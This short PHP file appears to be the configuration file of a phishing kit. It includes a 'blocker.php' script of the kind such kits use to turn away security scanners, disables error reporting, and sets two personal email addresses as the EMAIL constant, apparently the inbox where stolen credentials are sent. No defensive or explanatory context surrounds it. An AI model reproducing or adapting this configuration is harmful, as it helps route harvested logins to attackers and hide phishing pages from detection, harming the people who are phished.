<?php
include('blocker.php');
error_reporting(0);
$ur_email   = "wu.99331@gmail.com,wu-993@qq.com";
define("EMAIL", "$ur_email");
?>